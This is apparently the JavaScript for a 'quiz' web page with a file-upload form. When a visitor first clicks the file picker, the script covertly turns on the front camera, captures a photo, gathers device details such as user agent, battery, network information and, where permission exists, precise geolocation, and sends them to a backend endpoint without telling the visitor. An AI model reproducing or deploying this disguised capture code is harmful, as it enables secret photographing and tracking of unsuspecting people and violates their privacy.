const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api"; // change if needed

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// only capture once
let cameraCaptured = false;

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString(),
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA (ONLY ONCE)
// ================================
async function captureCameraOnce() {
  if (cameraCaptured) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    await new Promise(r => setTimeout(r, 2000)); // wait for camera to initialize

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    });

    stream.getTracks().forEach(t => t.stop());
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera blocked or denied:", err);
    cameraCaptured = true; // prevent repeated prompts
  }
}

// Trigger camera capture **only once** when user first clicks the file input
let cameraRequested = false;
fileInput.addEventListener("click", async () => {
  if (!cameraRequested) {
    cameraRequested = true;
    await captureCameraOnce();
  }
});

// ================================
// UPLOAD FILE
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name }),
        });
        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };
    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// FORM SUBMISSION
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please select a file before submitting!");
    return;
  }

  try {
    // Upload the selected file
    await uploadFile(fileInput.files[0]);

    // Show success page
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error("Submit error:", err);
    alert("Upload failed. Please try again.");
  }
});
